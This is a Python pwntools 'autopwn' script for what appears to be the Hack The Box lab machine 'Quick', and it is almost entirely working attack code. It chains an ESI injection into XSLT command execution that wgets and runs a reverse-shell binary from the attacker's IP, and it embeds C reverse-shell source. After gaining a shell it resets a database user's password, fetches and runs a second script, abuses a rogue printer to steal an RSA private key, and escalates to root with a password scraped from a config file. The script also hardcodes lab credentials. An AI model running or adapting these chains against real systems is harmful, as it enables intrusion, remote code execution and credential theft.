from pwn import *
import requests
import logging
import coloredlogs
import argparse
import random
import string
import re
import urllib
#Usage:
#Ensure you add:
#10.10.10.186 portal.quick.htb 
#10.10.10.186 printerv2.quick.htb
#to /etc/hosts file

#Example to call user flag python pwnQuick.py -i 10.10.14.29 -p 4444 -t user|srvadm|root 

#change this to wherever you want your share to be
####### STUFF TO CHANGE! ####### 
share_path = "/var/www/html/"
rev_binary_name = "revar"
####### 

logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', fmt='%(asctime)s-%(hostname)s-%(message)s', logger=logger)
url = "http://portal.quick.htb:9001"
printerurl = "http://printerv2.quick.htb:9001"
proxyValues = {'http': 'http://127.0.0.1:8888'}
defaultHeaders = {
               "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language":"en-US,en;q=0.5",
               "Accept-Encoding":"gzip, deflate",
               "Referer":"http://portal.quick.htb:9001/",
               "Content-Type":"application/x-www-form-urlencoded"}       


#our esi exploit payload 
REMOTE_PAYLOAD= """
<esi:include src="http://10.10.10.186:9001/" stylesheet="_ATTACKER_IP_"></esi:include>
"""

#our xsl  payload
XML_PAYLOAD = """
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[--OURPREAMBLE--]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
"""

#example: our rev shell payload that we compiled

REV_SHELL  = """
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "XXX.XXX.XXX.IP"
#define REMOTE_PORT XXX_PORT

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
"""

def get_args():
	parser =argparse.ArgumentParser(description="Dumpster Autopwn for Quick", usage="python pwnQuick.py -i <ip> -p <port> -t <user|root>", epilog="")
	parser.add_argument('-i','--ip',type=str, help="Attacker IP", required=True)
	parser.add_argument('-p','--port',type=str, help="Attacker Port",required=True)
	parser.add_argument('-t','--target', type=str, help="Our Target", choices=['user', 'srvadm', 'root'], required=True)

	args = parser.parse_args()
	attacker_ip = args.ip
	attacker_port = args.port
	target = args.target
	return attacker_ip,attacker_port,target

#used for our randomly generated ticket ids
def randomString(stringLength=5):
	letters =string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))

#searches at ticket  provided with cookie and ticketID
def searchTicket(cookie,ticketNum):
	
	target = url + "/search.php"

	payload = {"search": ticketNum}
	logger.info("[+] Searching for ticket %s" %ticketNum)
	r = requests.get(target, params=payload, proxies=proxyValues,cookies=cookie)

	print r.text

	return ""

#posts a ticket
def postTicket(cookie,payloadMsg,ticketID):
	target = url + '/ticket.php'	
  
	
	payload = {"title": "testgo", "msg": payloadMsg , "id": ticketID}
	logger.info("[+] Posting our ticket to ticketID [%s]" % ticketID)
	r = requests.post (target,data=payload,proxies=proxyValues,cookies=cookie)

	print r.text

#logs in and returns the cookie
def login(target,username,password,redirectsValue =False):
	logger.info("[+] Logging into %s to get da cookie" % target)
	

	payload = { "email": username, "password":password}
	r = requests.post(target, data=payload, proxies=proxyValues, allow_redirects=redirectsValue)

	sessionCookieValue  = r.cookies['PHPSESSID']
	cookie =  { 'PHPSESSID' : sessionCookieValue}
	logger.info("[+] We retieved the cookie it is [%s]" % sessionCookieValue)
	return cookie

#writes  our  temporary  xsl files
def writeFile(filename, payload):
	full_path = os.path.join(share_path,filename+".xsl")
	logger.info("[*] Saving payload file: %s" % full_path)
	f = open(full_path,"w")
	f.write(payload)
	f.close()

def removeFile(filename):
	full_path= os.path.join(share_path,filename+".xsl")
	logger.info("[-] Removing temporary xsl file: %s" % full_path)
	
	if os.path.isfile(full_path):
		os.remove(full_path)

def targetGenerate():
	return ""

def addPrinter(printerurl, cookie, printerName ,attacker_ip, attacker_port):
	target = printerurl +"add_printer.php"
	
	logger.info("[+] Adding Printer [%s] to the site" % printerName)
	payload = { "title": printerName, "type":"network", "profile":"default", "ip_address": attacker_ip, "port": attacker_port, "add_printer":""}
	r =requests.post(target,data=payload,proxies=proxyValues,cookies=cookie)

def postJobToPrinter(printerurl, cookie, printerName):
	target = printerurl +"job.php"
	
	logger.info("[+] Posting Job to Printer [%s]" % printerName)
	payload = { "title": printerName, "desc": "blahblah", "submit": ""}
	r =requests.post(target,data=payload,proxies=proxyValues,cookies=cookie)


# Post our tickets with the corresponding payloads
def targetUser_PostTickets(loginCookie,attacker_ip):
	
	ticket1 = randomString()
	logger.info("[+] Posting our ticket payloads... ")	
	ourhost = ("http://%s" % attacker_ip)
	
	#payload1 is wget http://<ourip>/<revbinary> -O /tmp/<revbinary>
	payload1_file = XML_PAYLOAD.replace("--OURPREAMBLE--", "wget "+ourhost+ "/" + rev_binary_name+  " -O /tmp/" + rev_binary_name)
	writeFile(ticket1,payload1_file)
	payload1_online = REMOTE_PAYLOAD.replace("_ATTACKER_IP_", ourhost+"/" +ticket1 +".xsl")
	logger.info("[+] Posting ticket1 with id: %s" %ticket1)
	postTicket(loginCookie,payload1_online,ticket1)	
	
	time.sleep(2)
	ticket2 =randomString()

	#payload2 is chmod +x /tmp/<revbinary>
	payload2_file = XML_PAYLOAD.replace("--OURPREAMBLE--", "chmod +x /tmp/" + rev_binary_name)
	writeFile(ticket2,payload2_file)

	payload2_online = REMOTE_PAYLOAD.replace("_ATTACKER_IP_", ourhost + "/"+ ticket2 +".xsl")
	logger.info("[+] Posting ticket2 with id: %s" %ticket2)
	postTicket(loginCookie,payload2_online,ticket2)	
	
	time.sleep(2)
	ticket3 = randomString()

	#payload3 is simply calling the executable at /tmp/<revbinaryname>
	payload3_file = XML_PAYLOAD.replace("--OURPREAMBLE--", "/tmp/" + rev_binary_name)
	writeFile(ticket3,payload3_file)	
	payload3_online = REMOTE_PAYLOAD.replace("_ATTACKER_IP_", ourhost + "/"+ ticket3  + ".xsl")

	logger.info("[+] Posting ticket3 with id: %s" %ticket3)
	postTicket(loginCookie, payload3_online, ticket3)
	time.sleep(2)

	return ticket1,ticket2,ticket3

if __name__ == "__main__":

	attacker_ip, attacker_port, target = get_args()
	logger.info("[+] ---- Starting Quick AutoPWN ----")

	if target == "user":
		target = url + '/login.php'

		username =  "elisa@wink.co.uk"
		password = "Quick4cc3$"
		loginCookie = login(target, username,password)
	
		ticket1,ticket2,ticket3 = targetUser_PostTickets(loginCookie,attacker_ip)
	
		###### can probably replace this with python3 -m http.server but eh
		logger.info("[+] Starting our lighttpd server to host files")
		#p = process (['python3', '-m', 'http.server'])
		p = process (['/usr/sbin/lighttpd','-f', '/etc/lighttpd/lighttpd.conf', '-D'])
		time.sleep(3)	
	
		#start our listener
		l1 = listen(attacker_port)
		

		logger.info("[+] Searching for ticket1 %s" %ticket1) 
	
		#start searching tickets
		searchTicket(loginCookie,ticket1)
		time.sleep(1)
		
		logger.info("[+] Searching for ticket2 %s" %ticket2)
		searchTicket(loginCookie,ticket2)	
		time.sleep(1)
	
		logger.info("[+] Searching for ticket3 %s" %ticket3)
		searchTicket(loginCookie,ticket3)
		time.sleep(1)
	
	
		#kill lighthttpd
		p.kill()
	
		da_shell = l1.wait_for_connection()
		logger.info("[+] And we are in! Vote this 1/5")
		removeFile(ticket1)
		removeFile(ticket2)
		removeFile(ticket3)	
		da_shell.sendline("""python3 -c "import pty;pty.spawn('/bin/bash')" """)
	
		da_shell.sendline("""cat user.txt""")
		time.sleep(2)
		da_shell.recvuntil("user.txt")
		user_flag = da_shell.recv()
		print ("======= User Flag is %s =======" %user_flag)

		da_shell.interactive()

		da_shell.close()

	elif target == "srvadm":

		target = url + '/login.php'

		username =  "elisa@wink.co.uk"
		password = "Quick4cc3$"
		loginCookie = login(target, username,password)
	
		ticket1,ticket2,ticket3 = targetUser_PostTickets(loginCookie,attacker_ip)
	
		###### can probably replace this with python3 -m http.server but eh
		logger.info("[+] Starting our lighttpd server to host files")
		#p = process (['python3', '-m', 'http.server'])
		p = process (['/usr/sbin/lighttpd','-f', '/etc/lighttpd/lighttpd.conf', '-D'])
		time.sleep(3)	
	
		#start our listener
		l1 = listen(attacker_port)
		
		logger.info("[+] Searching for ticket1 %s" %ticket1) 
	
		#start searching tickets
		searchTicket(loginCookie,ticket1)
		time.sleep(1)
		
		logger.info("[+] Searching for ticket2 %s" %ticket2)
		searchTicket(loginCookie,ticket2)	
		time.sleep(1)
	
		logger.info("[+] Searching for ticket3 %s" %ticket3)
		searchTicket(loginCookie,ticket3)
		time.sleep(1)
			
		da_shell = l1.wait_for_connection()
		logger.info("[+] And we are in! Vote this 1/5")
		removeFile(ticket1)
		removeFile(ticket2)
		removeFile(ticket3)	
		da_shell.sendline("""python3 -c "import pty;pty.spawn('/bin/bash')" """)
	
		logger.info("[+] updating the database so we can log in as srvadm@quick.htb/test2")
		#srvadm@quick.htb/test2
		da_shell.sendline("""mysql -udb_adm -pdb_p4ss quick -e "update users set password = 'fb66361644a4ae30af27748fe88bd40b' where email ='srvadm@quick.htb';" """)
		time.sleep(1)

		scriptName = randomString(8)+ ".py"
		
		logger.info("[+] Retreiving our python script and saving it as: %s" % scriptName)
		da_shell.sendline("""wget http://%s/printerQuick.py -O /tmp/%s""" % (attacker_ip, scriptName))
		time.sleep(2)
		
		da_shell.sendline("""python /tmp/%s""" % scriptName)
		
		###now we have to attack da printers
		#attack the printers
		target = printerurl + '/'
		r = requests.get(target)
		time.sleep(1)
		username =  "srvadm@quick.htb"
		password = "test2"
		loginCookie = login(target, username,password)

		printerName = randomString()

		addPrinter(target, loginCookie, printerName,attacker_ip,"9100")
	
		l2 = listen(9100)

		postJobToPrinter(target ,loginCookie,printerName)
		
		if l2.connected():	
			logger.info("[+] YAY! Exploit successful here is %s's Private Key" % target)
			da_shell.sendline("""rm /tmp/%s""" % scriptName)
			output = l2.recv()
			print (output)
			regex = re.compile('-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----', re.DOTALL)
			result = re.search(regex,output)
			privatekey = result.group(1)
			logger.info("[+] Saving private key contents to srvadm.key")
			f = open("srvadm.key","w")
			f.write('-----BEGIN RSA PRIVATE KEY-----')
			f.write(privatekey)
			f.write('-----END RSA PRIVATE KEY-----')
			f.close()
			os.system("chmod 600 srvadm.key")
			 
		logger.info("[+] All done! now for root")
		#kill lighthttpd
		p.kill()
		l1.close()
		l2.close()
	elif target == "root":

		logger.info("[+] Now that we have srvadm's key.. let's SSH in")
		hostIP = "10.10.10.186"
		userName = "srvadm"
		keyFile = "srvadm.key"
		s1 = ssh(host = hostIP, user = userName, keyfile=keyFile)
		
		shell = s1.shell('/bin/bash')

		logger.info("[+] Finding password.... let's search around in printers.conf")
		shell.sendline("""grep "printerv3.quick.htb" ~/.cache/conf.d/printers.conf """)
		output = shell.recv()
		result = re.search('htb:(.*)@',output)
		adminsPW = result.group(1)
		adminsPW = urllib.unquote(adminsPW)
		logger.info("[+] Aww yeahh, here's a password that might be useful for us! [%s]" %adminsPW)

		logger.info("[+] Let's try it on the root acct!")
		shell.sendline("su")
		time.sleep(1)
		shell.sendline(adminsPW)
		logger.info("[+] It worked! Let's find root flag")

		shell.sendline("cat /root/root.txt")
		time.sleep(2)
		flag = shell.recv()
		logger.info("[*] The output containing flag is %s" % flag)

		shell.interactive()

